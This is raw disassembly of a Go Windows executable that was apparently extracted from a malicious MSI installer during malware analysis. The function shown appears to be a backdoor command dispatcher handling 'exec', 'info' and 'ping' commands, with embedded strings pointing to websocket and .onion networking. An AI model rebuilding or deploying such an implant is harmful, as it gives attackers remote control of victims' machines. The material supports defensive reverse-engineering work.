
/home/ubuntu/malicious_msi_decode/analysis/extracted/support_v1.3/demand.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140272ca0 <.text+0x271ca0>:
   140272ca0 <main.rate>:	4c 8d a4 24 08 ff ff 	lea    r12,[rsp-0xf8]
   140272ca7:	ff 
   140272ca8:	4d 3b 66 10          	cmp    r12,QWORD PTR [r14+0x10]
   140272cac:	0f 86 4c 0d 00 00    	jbe    0x1402739fe
   140272cb2:	55                   	push   rbp
   140272cb3:	48 89 e5             	mov    rbp,rsp
   140272cb6:	48 81 ec 70 01 00 00 	sub    rsp,0x170
   140272cbd:	48 89 84 24 80 01 00 	mov    QWORD PTR [rsp+0x180],rax
   140272cc4:	00 
   140272cc5:	48 89 9c 24 88 01 00 	mov    QWORD PTR [rsp+0x188],rbx
   140272ccc:	00 
   140272ccd:	48 89 8c 24 90 01 00 	mov    QWORD PTR [rsp+0x190],rcx
   140272cd4:	00 
   140272cd5:	48 89 bc 24 98 01 00 	mov    QWORD PTR [rsp+0x198],rdi
   140272cdc:	00 
   140272cdd:	48 89 b4 24 a0 01 00 	mov    QWORD PTR [rsp+0x1a0],rsi
   140272ce4:	00 
   140272ce5:	4c 89 84 24 a8 01 00 	mov    QWORD PTR [rsp+0x1a8],r8
   140272cec:	00 
   140272ced:	4c 89 8c 24 b0 01 00 	mov    QWORD PTR [rsp+0x1b0],r9
   140272cf4:	00 
   140272cf5:	44 0f 11 7c 24 58    	movups XMMWORD PTR [rsp+0x58],xmm15
   140272cfb:	44 0f 11 7c 24 60    	movups XMMWORD PTR [rsp+0x60],xmm15
   140272d01:	44 0f 11 7c 24 70    	movups XMMWORD PTR [rsp+0x70],xmm15
   140272d07:	44 0f 11 bc 24 80 00 	movups XMMWORD PTR [rsp+0x80],xmm15
   140272d0e:	00 00 
   140272d10:	48 8b 8c 24 88 01 00 	mov    rcx,QWORD PTR [rsp+0x188]
   140272d17:	00 
   140272d18:	0f 1f 84 00 00 00 00 	nop    DWORD PTR [rax+rax*1+0x0]
   140272d1f:	00 
   140272d20:	48 85 c9             	test   rcx,rcx
   140272d23:	0f 84 bc 0b 00 00    	je     0x1402738e5
   140272d29:	48 89 4c 24 50       	mov    QWORD PTR [rsp+0x50],rcx
   140272d2e:	48 8b 94 24 98 01 00 	mov    rdx,QWORD PTR [rsp+0x198]
   140272d35:	00 
   140272d36:	48 8b b4 24 90 01 00 	mov    rsi,QWORD PTR [rsp+0x190]
   140272d3d:	00 
   140272d3e:	66 90                	xchg   ax,ax
   140272d40:	48 83 fa 04          	cmp    rdx,0x4
   140272d44:	0f 85 02 09 00 00    	jne    0x14027364c
   140272d4a:	81 3e 65 78 65 63    	cmp    DWORD PTR [rsi],0x63657865
   140272d50:	0f 84 e8 04 00 00    	je     0x14027323e
   140272d56:	81 3e 69 6e 66 6f    	cmp    DWORD PTR [rsi],0x6f666e69
   140272d5c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
   140272d60:	0f 84 40 02 00 00    	je     0x140272fa6
   140272d66:	81 3e 70 69 6e 67    	cmp    DWORD PTR [rsi],0x676e6970
   140272d6c:	0f 85 51 0a 00 00    	jne    0x1402737c3
   140272d72:	e8 a9 de df ff       	call   0x140070c20 <runtime.makemap_small>
   140272d77:	48 89 84 24 60 01 00 	mov    QWORD PTR [rsp+0x160],rax
   140272d7e:	00 
   140272d7f:	48 89 c3             	mov    rbx,rax
   140272d82:	48 8d 0d 4e 25 0f 00 	lea    rcx,[rip+0xf254e]        # 0x1403652d7 'messageunknownnil keynumber windowsrunningwsarecvwsasendconnectlookup writetoPATHEXTabortedCopySidWS'
   140272d89:	bf 07 00 00 00       	mov    edi,0x7
   140272d8e:	48 8d 05 4b f8 09 00 	lea    rax,[rip+0x9f84b]        # 0x1403125e0 '\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xa4j^\\xc7\x02\x08\x085\x00\x00\x00\x00\x00\x00\x00\x00H >@\x01\x00\x00\x00\\xaf\x1a\x01\x00\x00\x00\x00\x00\\x80R/@\x01\x00\x00\x00\\xe0,0@\x01\x00\x00\x00\\xe0\\xa91@\x01\x00\x00\x00\\x90I8@\x01\x00\x00\x00\x08\x01\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00'
   140272d95:	e8 06 62 d9 ff       	call   0x140008fa0 <runtime.mapassign_faststr>
   140272d9a:	48 8d 0d df 24 08 00 	lea    rcx,[rip+0x824df]        # 0x1402f5280 '\x10\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xb82\\x87\\xf8\x07\x08\x08\x18\\xa8I8@\x01\x00\x00\x00H >@\x01\x00\x00\x00\x03-\x00\x00@\\xbc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x15%\\xbc\x0f\x01\x01\x03\\xb0I8@\x01\x00\x00\x00\\xe82>@'
   140272da1:	48 89 08             	mov    QWORD PTR [rax],rcx
   140272da4:	83 3d 15 50 3e 00 00 	cmp    DWORD PTR [rip+0x3e5015],0x0        # 0x140657dc0 ''
   140272dab:	74 0c                	je     0x140272db9
   140272dad:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
   140272db1:	e8 6a 7a e0 ff       	call   0x14007a820 <runtime.gcWriteBarrier1>
   140272db6:	49 89 0b             	mov    QWORD PTR [r11],rcx
   140272db9:	48 8d 0d 60 09 17 00 	lea    rcx,[rip+0x170960]        # 0x1403e3720 '\\xe8K6@\x01\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x19P6@\x01\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\\xa9\\xec6@\x01\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\\xf6\\x986@\x01\x00\x00\x00\x13\x00\x00\x00\x00\x00\x00\x00[j6@\x01\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00F;7@\x01\x00\x00\x00%\x00\x00\x00\x00\x00\x00\x00\x04t7@'
   140272dc0:	48 89 48 08          	mov    QWORD PTR [rax+0x8],rcx
   140272dc4:	e8 b7 4e e3 ff       	call   0x1400a7c80 <time.Now>
   140272dc9:	48 89 84 24 08 01 00 	mov    QWORD PTR [rsp+0x108],rax
   140272dd0:	00 
   140272dd1:	48 89 9c 24 10 01 00 	mov    QWORD PTR [rsp+0x110],rbx
   140272dd8:	00 
   140272dd9:	48 89 8c 24 18 01 00 	mov    QWORD PTR [rsp+0x118],rcx
   140272de0:	00 
   140272de1:	48 89 84 24 a8 00 00 	mov    QWORD PTR [rsp+0xa8],rax
   140272de8:	00 
   140272de9:	48 89 9c 24 b0 00 00 	mov    QWORD PTR [rsp+0xb0],rbx
   140272df0:	00 
   140272df1:	48 89 8c 24 b8 00 00 	mov    QWORD PTR [rsp+0xb8],rcx
   140272df8:	00 
   140272df9:	90                   	nop
   140272dfa:	90                   	nop
   140272dfb:	48 0f ba e0 3f       	bt     rax,0x3f
   140272e00:	73 2c                	jae    0x140272e2e
   140272e02:	48 89 c1             	mov    rcx,rax
   140272e05:	25 ff ff ff 3f       	and    eax,0x3fffffff
   140272e0a:	48 01 c9             	add    rcx,rcx
   140272e0d:	48 c1 e9 1f          	shr    rcx,0x1f
   140272e11:	48 ba 80 7f b1 d7 0d 	movabs rdx,0xdd7b17f80
   140272e18:	00 00 00 
   140272e1b:	48 01 d1             	add    rcx,rdx
   140272e1e:	48 89 8c 24 b0 00 00 	mov    QWORD PTR [rsp+0xb0],rcx
   140272e25:	00 
   140272e26:	48 89 84 24 a8 00 00 	mov    QWORD PTR [rsp+0xa8],rax
   140272e2d:	00 
   140272e2e:	48 c7 84 24 b8 00 00 	mov    QWORD PTR [rsp+0xb8],0x0
   140272e35:	00 00 00 00 00 
   140272e3a:	48 8b 8c 24 a8 00 00 	mov    rcx,QWORD PTR [rsp+0xa8]
   140272e41:	00 
   140272e42:	48 8b 94 24 b0 00 00 	mov    rdx,QWORD PTR [rsp+0xb0]
   140272e49:	00 
   140272e4a:	48 89 8c 24 08 01 00 	mov    QWORD PTR [rsp+0x108],rcx
   140272e51:	00 
   140272e52:	48 89 94 24 10 01 00 	mov    QWORD PTR [rsp+0x110],rdx
   140272e59:	00 
   140272e5a:	48 c7 84 24 18 01 00 	mov    QWORD PTR [rsp+0x118],0x0
   140272e61:	00 00 00 00 00 
   140272e66:	48 8d 05 d3 ce 0e 00 	lea    rax,[rip+0xeced3]        # 0x14035fd40 '\x18\x00\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00\\xe9\\xc2Ss\x0f\x08\x08\x19\\xc0\\x99-@\x01\x00\x00\x00\x00!>@\x01\x00\x00\x00\\xefV\x00\x00\x00\x05\t\x00\\xd0\x07-@\x01\x00\x00\x00\\xa0\\xfd5@\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\\xd0\x07\x00\x001\x00+\x00X\x00\x00\x00\x00\x00\x00\x00\\xf4\x07-@'
   140272e6d:	48 8d 9c 24 08 01 00 	lea    rbx,[rsp+0x108]
   140272e74:	00 
   140272e75:	e8 c6 f8 d9 ff       	call   0x140012740 <runtime.convT>
   140272e7a:	48 89 84 24 58 01 00 	mov    QWORD PTR [rsp+0x158],rax
   140272e81:	00 
   140272e82:	48 8d 05 57 f7 09 00 	lea    rax,[rip+0x9f757]        # 0x1403125e0 '\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xa4j^\\xc7\x02\x08\x085\x00\x00\x00\x00\x00\x00\x00\x00H >@\x01\x00\x00\x00\\xaf\x1a\x01\x00\x00\x00\x00\x00\\x80R/@\x01\x00\x00\x00\\xe0,0@\x01\x00\x00\x00\\xe0\\xa91@\x01\x00\x00\x00\\x90I8@\x01\x00\x00\x00\x08\x01\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00'
   140272e89:	48 8b 9c 24 60 01 00 	mov    rbx,QWORD PTR [rsp+0x160]
   140272e90:	00 
   140272e91:	48 8d 0d 54 1d 0f 00 	lea    rcx,[rip+0xf1d54]        # 0x140364bec "timedonepingUSERPOST/allnullbooltruejson'\\''icmpigmpftpshttppop3smtp) = dialbindfile \r\t\nread on pipe"
   140272e98:	bf 04 00 00 00       	mov    edi,0x4
   140272e9d:	0f 1f 00             	nop    DWORD PTR [rax]
   140272ea0:	e8 fb 60 d9 ff       	call   0x140008fa0 <runtime.mapassign_faststr>
   140272ea5:	48 8d 0d 94 ce 0e 00 	lea    rcx,[rip+0xece94]        # 0x14035fd40 '\x18\x00\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00\\xe9\\xc2Ss\x0f\x08\x08\x19\\xc0\\x99-@\x01\x00\x00\x00\x00!>@\x01\x00\x00\x00\\xefV\x00\x00\x00\x05\t\x00\\xd0\x07-@\x01\x00\x00\x00\\xa0\\xfd5@\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\\xd0\x07\x00\x001\x00+\x00X\x00\x00\x00\x00\x00\x00\x00\\xf4\x07-@'
   140272eac:	48 89 08             	mov    QWORD PTR [rax],rcx
   140272eaf:	83 3d 0a 4f 3e 00 00 	cmp    DWORD PTR [rip+0x3e4f0a],0x0        # 0x140657dc0 ''
   140272eb6:	75 0a                	jne    0x140272ec2
   140272eb8:	48 8b b4 24 58 01 00 	mov    rsi,QWORD PTR [rsp+0x158]
   140272ebf:	00 
   140272ec0:	eb 18                	jmp    0x140272eda
   140272ec2:	48 8b 50 08          	mov    rdx,QWORD PTR [rax+0x8]
   140272ec6:	e8 75 79 e0 ff       	call   0x14007a840 <runtime.gcWriteBarrier2>
   140272ecb:	48 8b b4 24 58 01 00 	mov    rsi,QWORD PTR [rsp+0x158]
   140272ed2:	00 
   140272ed3:	49 89 33             	mov    QWORD PTR [r11],rsi
   140272ed6:	49 89 53 08          	mov    QWORD PTR [r11+0x8],rdx
   140272eda:	48 89 70 08          	mov    QWORD PTR [rax+0x8],rsi
   140272ede:	48 8b 84 24 80 01 00 	mov    rax,QWORD PTR [rsp+0x180]
   140272ee5:	00 
   140272ee6:	48 8b 9c 24 88 01 00 	mov    rbx,QWORD PTR [rsp+0x188]
   140272eed:	00 
   140272eee:	48 8d 0d eb f6 09 00 	lea    rcx,[rip+0x9f6eb]        # 0x1403125e0 '\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xa4j^\\xc7\x02\x08\x085\x00\x00\x00\x00\x00\x00\x00\x00H >@\x01\x00\x00\x00\\xaf\x1a\x01\x00\x00\x00\x00\x00\\x80R/@\x01\x00\x00\x00\\xe0,0@\x01\x00\x00\x00\\xe0\\xa91@\x01\x00\x00\x00\\x90I8@\x01\x00\x00\x00\x08\x01\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00'
   140272ef5:	48 8b bc 24 60 01 00 	mov    rdi,QWORD PTR [rsp+0x160]
   140272efc:	00 
   140272efd:	0f 1f 00             	nop    DWORD PTR [rax]
   140272f00:	e8 3b 8e ed ff       	call   0x14014bd40 <demand/cmd/artifact/internal/shared.NewSuccessResult>
   140272f05:	48 89 84 24 d0 00 00 	mov    QWORD PTR [rsp+0xd0],rax
   140272f0c:	00 
   140272f0d:	48 89 9c 24 d8 00 00 	mov    QWORD PTR [rsp+0xd8],rbx
   140272f14:	00 
   140272f15:	48 89 8c 24 e0 00 00 	mov    QWORD PTR [rsp+0xe0],rcx
   140272f1c:	00 
   140272f1d:	48 89 bc 24 e8 00 00 	mov    QWORD PTR [rsp+0xe8],rdi
   140272f24:	00 
   140272f25:	48 89 b4 24 f0 00 00 	mov    QWORD PTR [rsp+0xf0],rsi
   140272f2c:	00 
   140272f2d:	4c 89 84 24 f8 00 00 	mov    QWORD PTR [rsp+0xf8],r8
   140272f34:	00 
   140272f35:	4c 89 8c 24 00 01 00 	mov    QWORD PTR [rsp+0x100],r9
   140272f3c:	00 
   140272f3d:	48 8b 94 24 d0 00 00 	mov    rdx,QWORD PTR [rsp+0xd0]
   140272f44:	00 
   140272f45:	48 89 54 24 58       	mov    QWORD PTR [rsp+0x58],rdx
   140272f4a:	0f 10 84 24 d8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xd8]
   140272f51:	00 
   140272f52:	0f 11 44 24 60       	movups XMMWORD PTR [rsp+0x60],xmm0
   140272f57:	0f 10 84 24 e8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xe8]
   140272f5e:	00 
   140272f5f:	0f 11 44 24 70       	movups XMMWORD PTR [rsp+0x70],xmm0
   140272f64:	0f 10 84 24 f8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xf8]
   140272f6b:	00 
   140272f6c:	0f 11 84 24 80 00 00 	movups XMMWORD PTR [rsp+0x80],xmm0
   140272f73:	00 
   140272f74:	48 8b 44 24 58       	mov    rax,QWORD PTR [rsp+0x58]
   140272f79:	48 8b 5c 24 60       	mov    rbx,QWORD PTR [rsp+0x60]
   140272f7e:	48 8b 4c 24 68       	mov    rcx,QWORD PTR [rsp+0x68]
   140272f83:	48 8b 7c 24 70       	mov    rdi,QWORD PTR [rsp+0x70]
   140272f88:	48 8b 74 24 78       	mov    rsi,QWORD PTR [rsp+0x78]
   140272f8d:	4c 8b 84 24 80 00 00 	mov    r8,QWORD PTR [rsp+0x80]
   140272f94:	00 
   140272f95:	4c 8b 8c 24 88 00 00 	mov    r9,QWORD PTR [rsp+0x88]
   140272f9c:	00 
   140272f9d:	48 81 c4 70 01 00 00 	add    rsp,0x170
   140272fa4:	5d                   	pop    rbp
   140272fa5:	c3                   	ret
   140272fa6:	e8 15 2a 00 00       	call   0x1402759c0 <main.fortify>
   140272fab:	48 85 c9             	test   rcx,rcx
   140272fae:	0f 85 59 01 00 00    	jne    0x14027310d
   140272fb4:	48 89 5c 24 48       	mov    QWORD PTR [rsp+0x48],rbx
   140272fb9:	48 89 84 24 c8 00 00 	mov    QWORD PTR [rsp+0xc8],rax
   140272fc0:	00 
   140272fc1:	e8 5a dc df ff       	call   0x140070c20 <runtime.makemap_small>
   140272fc6:	48 89 84 24 60 01 00 	mov    QWORD PTR [rsp+0x160],rax
   140272fcd:	00 
   140272fce:	48 8b 84 24 c8 00 00 	mov    rax,QWORD PTR [rsp+0xc8]
   140272fd5:	00 
   140272fd6:	48 8b 5c 24 48       	mov    rbx,QWORD PTR [rsp+0x48]
   140272fdb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]
   140272fe0:	e8 5b d5 df ff       	call   0x140070540 <runtime.convTstring>
   140272fe5:	48 89 84 24 58 01 00 	mov    QWORD PTR [rsp+0x158],rax
   140272fec:	00 
   140272fed:	48 8d 05 ec f5 09 00 	lea    rax,[rip+0x9f5ec]        # 0x1403125e0 '\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xa4j^\\xc7\x02\x08\x085\x00\x00\x00\x00\x00\x00\x00\x00H >@\x01\x00\x00\x00\\xaf\x1a\x01\x00\x00\x00\x00\x00\\x80R/@\x01\x00\x00\x00\\xe0,0@\x01\x00\x00\x00\\xe0\\xa91@\x01\x00\x00\x00\\x90I8@\x01\x00\x00\x00\x08\x01\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00'
   140272ff4:	48 8b 9c 24 60 01 00 	mov    rbx,QWORD PTR [rsp+0x160]
   140272ffb:	00 
   140272ffc:	48 8d 0d 10 20 0f 00 	lea    rcx,[rip+0xf2010]        # 0x140365013 'outputError:wss://objectnumberstringnetdnsdomaingophertelnetreturn.locallisten.onionip+netsocketacce'
   140273003:	bf 06 00 00 00       	mov    edi,0x6
   140273008:	e8 93 5f d9 ff       	call   0x140008fa0 <runtime.mapassign_faststr>
   14027300d:	48 8d 0d 6c 22 08 00 	lea    rcx,[rip+0x8226c]        # 0x1402f5280 '\x10\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xb82\\x87\\xf8\x07\x08\x08\x18\\xa8I8@\x01\x00\x00\x00H >@\x01\x00\x00\x00\x03-\x00\x00@\\xbc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x15%\\xbc\x0f\x01\x01\x03\\xb0I8@\x01\x00\x00\x00\\xe82>@'
   140273014:	48 89 08             	mov    QWORD PTR [rax],rcx
   140273017:	83 3d a2 4d 3e 00 00 	cmp    DWORD PTR [rip+0x3e4da2],0x0        # 0x140657dc0 ''
   14027301e:	66 90                	xchg   ax,ax
   140273020:	75 0a                	jne    0x14027302c
   140273022:	48 8b b4 24 58 01 00 	mov    rsi,QWORD PTR [rsp+0x158]
   140273029:	00 
   14027302a:	eb 18                	jmp    0x140273044
   14027302c:	48 8b 50 08          	mov    rdx,QWORD PTR [rax+0x8]
   140273030:	e8 0b 78 e0 ff       	call   0x14007a840 <runtime.gcWriteBarrier2>
   140273035:	48 8b b4 24 58 01 00 	mov    rsi,QWORD PTR [rsp+0x158]
   14027303c:	00 
   14027303d:	49 89 33             	mov    QWORD PTR [r11],rsi
   140273040:	49 89 53 08          	mov    QWORD PTR [r11+0x8],rdx
   140273044:	48 89 70 08          	mov    QWORD PTR [rax+0x8],rsi
   140273048:	48 8b 84 24 80 01 00 	mov    rax,QWORD PTR [rsp+0x180]
   14027304f:	00 
   140273050:	48 8b 9c 24 88 01 00 	mov    rbx,QWORD PTR [rsp+0x188]
   140273057:	00 
   140273058:	48 8d 0d 81 f5 09 00 	lea    rcx,[rip+0x9f581]        # 0x1403125e0 '\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xa4j^\\xc7\x02\x08\x085\x00\x00\x00\x00\x00\x00\x00\x00H >@\x01\x00\x00\x00\\xaf\x1a\x01\x00\x00\x00\x00\x00\\x80R/@\x01\x00\x00\x00\\xe0,0@\x01\x00\x00\x00\\xe0\\xa91@\x01\x00\x00\x00\\x90I8@\x01\x00\x00\x00\x08\x01\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00'
   14027305f:	48 8b bc 24 60 01 00 	mov    rdi,QWORD PTR [rsp+0x160]
   140273066:	00 
   140273067:	e8 d4 8c ed ff       	call   0x14014bd40 <demand/cmd/artifact/internal/shared.NewSuccessResult>
   14027306c:	48 89 84 24 d0 00 00 	mov    QWORD PTR [rsp+0xd0],rax
   140273073:	00 
   140273074:	48 89 9c 24 d8 00 00 	mov    QWORD PTR [rsp+0xd8],rbx
   14027307b:	00 
   14027307c:	48 89 8c 24 e0 00 00 	mov    QWORD PTR [rsp+0xe0],rcx
   140273083:	00 
   140273084:	48 89 bc 24 e8 00 00 	mov    QWORD PTR [rsp+0xe8],rdi
   14027308b:	00 
   14027308c:	48 89 b4 24 f0 00 00 	mov    QWORD PTR [rsp+0xf0],rsi
   140273093:	00 
   140273094:	4c 89 84 24 f8 00 00 	mov    QWORD PTR [rsp+0xf8],r8
   14027309b:	00 
   14027309c:	4c 89 8c 24 00 01 00 	mov    QWORD PTR [rsp+0x100],r9
   1402730a3:	00 
   1402730a4:	48 8b 94 24 d0 00 00 	mov    rdx,QWORD PTR [rsp+0xd0]
   1402730ab:	00 
   1402730ac:	48 89 54 24 58       	mov    QWORD PTR [rsp+0x58],rdx
   1402730b1:	0f 10 84 24 d8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xd8]
   1402730b8:	00 
   1402730b9:	0f 11 44 24 60       	movups XMMWORD PTR [rsp+0x60],xmm0
   1402730be:	0f 10 84 24 e8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xe8]
   1402730c5:	00 
   1402730c6:	0f 11 44 24 70       	movups XMMWORD PTR [rsp+0x70],xmm0
   1402730cb:	0f 10 84 24 f8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xf8]
   1402730d2:	00 
   1402730d3:	0f 11 84 24 80 00 00 	movups XMMWORD PTR [rsp+0x80],xmm0
   1402730da:	00 
   1402730db:	48 8b 44 24 58       	mov    rax,QWORD PTR [rsp+0x58]
   1402730e0:	48 8b 5c 24 60       	mov    rbx,QWORD PTR [rsp+0x60]
   1402730e5:	48 8b 4c 24 68       	mov    rcx,QWORD PTR [rsp+0x68]
   1402730ea:	48 8b 7c 24 70       	mov    rdi,QWORD PTR [rsp+0x70]
   1402730ef:	48 8b 74 24 78       	mov    rsi,QWORD PTR [rsp+0x78]
   1402730f4:	4c 8b 84 24 80 00 00 	mov    r8,QWORD PTR [rsp+0x80]
   1402730fb:	00 
   1402730fc:	4c 8b 8c 24 88 00 00 	mov    r9,QWORD PTR [rsp+0x88]
   140273103:	00 
   140273104:	48 81 c4 70 01 00 00 	add    rsp,0x170
   14027310b:	5d                   	pop    rbp
   14027310c:	c3                   	ret
   14027310d:	48 8b 49 18          	mov    rcx,QWORD PTR [rcx+0x18]
   140273111:	48 89 f8             	mov    rax,rdi
   140273114:	ff d1                	call   rcx
   140273116:	48 8b 8c 24 80 01 00 	mov    rcx,QWORD PTR [rsp+0x180]
   14027311d:	00 
   14027311e:	48 89 8c 24 98 00 00 	mov    QWORD PTR [rsp+0x98],rcx
   140273125:	00 
   140273126:	48 8b 8c 24 88 01 00 	mov    rcx,QWORD PTR [rsp+0x188]
   14027312d:	00 
   14027312e:	48 89 4c 24 30       	mov    QWORD PTR [rsp+0x30],rcx
   140273133:	44 0f 11 bc 24 20 01 	movups XMMWORD PTR [rsp+0x120],xmm15
   14027313a:	00 00 
   14027313c:	44 0f 11 bc 24 30 01 	movups XMMWORD PTR [rsp+0x130],xmm15
   140273143:	00 00 
   140273145:	44 0f 11 bc 24 40 01 	movups XMMWORD PTR [rsp+0x140],xmm15
   14027314c:	00 00 
   14027314e:	48 89 84 24 40 01 00 	mov    QWORD PTR [rsp+0x140],rax
   140273155:	00 
   140273156:	48 89 9c 24 48 01 00 	mov    QWORD PTR [rsp+0x148],rbx
   14027315d:	00 
   14027315e:	48 8d 05 9b d9 0b 00 	lea    rax,[rip+0xbd99b]        # 0x140330b00 '0\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00ҩz\\xef\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00\x18!>@\x01\x00\x00\x00\\x80\\xc0\x00\x00\\xc0\\xa9\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00`\x0b3@\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\\xa1O\x01\x00\x00\x00\x00\x00X\x00\x00\x00\x00\x00\x00\x00\x18\x0b.@'
   140273165:	48 8d 9c 24 20 01 00 	lea    rbx,[rsp+0x120]
   14027316c:	00 
   14027316d:	e8 ce f5 d9 ff       	call   0x140012740 <runtime.convT>
   140273172:	48 89 c3             	mov    rbx,rax
   140273175:	48 8d 05 84 d9 0b 00 	lea    rax,[rip+0xbd984]        # 0x140330b00 '0\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00ҩz\\xef\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00\x18!>@\x01\x00\x00\x00\\x80\\xc0\x00\x00\\xc0\\xa9\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00`\x0b3@\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\\xa1O\x01\x00\x00\x00\x00\x00X\x00\x00\x00\x00\x00\x00\x00\x18\x0b.@'
   14027317c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
   140273180:	e8 3b 7e e8 ff       	call   0x1400fafc0 <encoding/json.Marshal>
   140273185:	48 8b 94 24 98 00 00 	mov    rdx,QWORD PTR [rsp+0x98]
   14027318c:	00 
   14027318d:	48 89 94 24 d0 00 00 	mov    QWORD PTR [rsp+0xd0],rdx
   140273194:	00 
   140273195:	48 8b 54 24 30       	mov    rdx,QWORD PTR [rsp+0x30]
   14027319a:	48 89 94 24 d8 00 00 	mov    QWORD PTR [rsp+0xd8],rdx
   1402731a1:	00 
   1402731a2:	48 8d 15 64 1e 0f 00 	lea    rdx,[rip+0xf1e64]        # 0x14036500d 'resultoutputError:wss://objectnumberstringnetdnsdomaingophertelnetreturn.locallisten.onionip+netsock'
   1402731a9:	48 89 94 24 e0 00 00 	mov    QWORD PTR [rsp+0xe0],rdx
   1402731b0:	00 
   1402731b1:	48 c7 84 24 e8 00 00 	mov    QWORD PTR [rsp+0xe8],0x6
   1402731b8:	00 06 00 00 00 
   1402731bd:	48 89 84 24 f0 00 00 	mov    QWORD PTR [rsp+0xf0],rax
   1402731c4:	00 
   1402731c5:	48 89 9c 24 f8 00 00 	mov    QWORD PTR [rsp+0xf8],rbx
   1402731cc:	00 
   1402731cd:	48 89 8c 24 00 01 00 	mov    QWORD PTR [rsp+0x100],rcx
   1402731d4:	00 
   1402731d5:	48 8b 8c 24 d0 00 00 	mov    rcx,QWORD PTR [rsp+0xd0]
   1402731dc:	00 
   1402731dd:	48 89 4c 24 58       	mov    QWORD PTR [rsp+0x58],rcx
   1402731e2:	0f 10 84 24 d8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xd8]
   1402731e9:	00 
   1402731ea:	0f 11 44 24 60       	movups XMMWORD PTR [rsp+0x60],xmm0
   1402731ef:	0f 10 84 24 e8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xe8]
   1402731f6:	00 
   1402731f7:	0f 11 44 24 70       	movups XMMWORD PTR [rsp+0x70],xmm0
   1402731fc:	0f 10 84 24 f8 00 00 	movups xmm0,XMMWORD PTR [rsp+0xf8]
   140273203:	00 
   140273204:	0f 11 84 24 80 00 00 	movups XMMWORD PTR [rsp+0x80],xmm0
   14027320b:	00 
   14027320c:	48 8b 44 24 58       	mov    rax,QWORD PTR [rsp+0x58]
   140273211:	48 8b 5c 24 60       	mov    rbx,QWORD PTR [rsp+0x60]
   140273216:	48 8b 4c 24 68       	mov    rcx,QWORD PTR [rsp+0x68]
   14027321b:	48 8b 7c 24 70       	mov    rdi,QWORD PTR [rsp+0x70]
   140273220:	48 8b 74 24 78       	mov    rsi,QWORD PTR [rsp+0x78]
   140273225:	4c 8b 84 24 80 00 00 	mov    r8,QWORD PTR [rsp+0x80]
   14027322c:	00 
   14027322d:	4c 8b 8c 24 88 00 00 	mov    r9,QWORD PTR [rsp+0x88]
   140273234:	00 
   140273235:	48 81 c4 70 01 00 00 	add    rsp,0x170
   14027323c:	5d                   	pop    rbp
   14027323d:	c3                   	ret
   14027323e:	48 8d 05 7b 3a 0b 00 	lea    rax,[rip+0xb3a7b]        # 0x140326cc0 '(\x00\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00\\xec\\xca}#\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00P >@\x01\x00\x00\x00F{\x00\x00@\\xaa\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00 m2@\x01\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\\xa1O\x01\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00H\x0b.@'
